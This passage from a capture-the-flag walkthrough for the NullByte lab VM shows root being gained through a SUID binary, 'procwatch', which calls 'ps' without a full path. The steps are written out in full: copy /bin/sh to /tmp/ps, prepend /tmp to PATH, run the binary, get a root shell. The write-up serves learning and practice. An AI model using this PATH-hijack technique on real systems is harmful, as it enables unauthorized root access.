-<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>
-
-<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>
-
-<p><code>plain
-sudo -s
-su eric
-exit
-ls
-clear
-cd /var/www
-cd backup/
-ls
-./procwatch
-clear
-sudo -s
-cd /
-ls
-exit
-</code></p>
-
-<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>
-
-<p><code>plain
-ls -l /var/www/backup
-total 12
--rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
--rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
-cat readme.txt
-I have to fix this mess...
-</code></p>
-
-<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>
-
-<p><code>plain
-./procwatch
-  PID TTY          TIME CMD
- 1535 pts/0    00:00:00 procwatch
- 1536 pts/0    00:00:00 sh
- 1537 pts/0    00:00:00 ps
-</code></p>
-
-<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>
-
-<p><code>plain
-ps
-  PID TTY          TIME CMD
- 1555 pts/0    00:00:00 bash
- 1605 pts/0    00:00:00 ps
-</code></p>
-
-<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>
-
-<blockquote><p>By default, ps selects all processes with the same effective user ID
-(euid=EUID) as the current user and associated with the same terminal
-as the invoker.</p></blockquote>
-
-<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>
-
-<p><code>plain
-cp /bin/sh /tmp/ps
-</code></p>
-
-<p>Let&rsquo;s look at the PATH environment variable:</p>
-
-<p><code>plain
-echo $PATH
-/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-</code></p>
-
-<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>
-
-<p><code>plain
-export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-ramses@NullByte:/var/www/backup$ echo $PATH
-/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-</code></p>
-
-<p>Fingers crossed, running procwatch again:</p>
-
-<p>``` plain
-ramses@NullByte:/var/www/backup$ ./procwatch</p>
-
-<h1>whoami</h1>
-
-<p>root
-```</p>
-
-<p>And we&rsquo;re root..the right way! :D</p>
-
-<p>``` plain
-/ You&rsquo;ll wish that you had done some of \
-| the hard things when they were easier |
-\ to do.                                /</p>
 
 <hr />
 
